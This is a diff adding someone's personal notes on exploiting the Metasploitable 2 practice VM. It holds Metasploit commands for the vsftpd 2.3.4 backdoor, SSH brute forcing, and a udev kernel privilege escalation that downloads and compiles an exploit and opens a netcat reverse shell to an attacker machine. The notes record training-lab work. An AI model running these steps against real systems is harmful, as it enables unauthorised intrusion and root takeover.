@@ -1,0 +1,69 @@
+This fiel will have all my tryies (in details) to exploite metaslpoitable 2 VM
+https://sourceforge.net/projects/metasploitable/
+
+-----------------------------------------------
+#Vulnerability:	ftp (vsftpd 2.3.4)
+#Details:	this version has a backdoor (someone impelementet it)
+#Privilege:	root
+#Used Tool:	metasploit
+
+msconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options set rhost 192.168.163.50
+run
+-----------------------------------------------
+#Vulnerability:	None
+#Details:	brute forece
+#Privilege:	not root (msfadmin)
+#Used Tool:	metasploite auxiliary
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.163.50
+set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+set VERBOSE false
+run
+
+use post/multi/manage/shell_to_meterpreter
+set session 1
+run
+
+------------------
+#Privilege Escalation
+#Vulnerability:	Linux Kernal 2.6.24, udev before 1.4.1 does not verify whether a NETLINK message originates from kernel space
+#Ref:		http://linux-hacking-guide.blogspot.co.uk/2015/05/metasploitable-2-privilege-escalation.html
+
+user@metasploitable:~$ uname -a
+user@metasploitable:~$ wget --no-check-certificate http://www.exploit-db.com/download/8572
+user@metasploitable:~$ gcc -o 8572 8572.c
+user@metasploitable:~$ cat /proc/net/netlink	# neededValue = PID
+#or
+user@metasploitable:~$ ps aux|grep udev		# neededValue = PID - 1
+user@metasploitable:~$ nano /tmp/run
+#!/bin/bash
+/bin/netcat -e /bin/bash 192.168.163.32 1337
+
+root@kali:~# nc -l -p 1337
+# or 
+use exploit/multi/handler
+set payload cmd/unix/reverse_bash
+set lhost 192.168.163.32
+set lport 1337
+run -j
+
+user@metasploitable:~$./priv neededValue 
+
+------------------
+
+# New learend subjects
+To know kernal version:
+uname -r
+
+To konw which distor is running:
+lsb_release -a
+
+-----------------------------------------------
+#Vulnerability:
+#Details:
+#Privilege:
+#Used Tool:
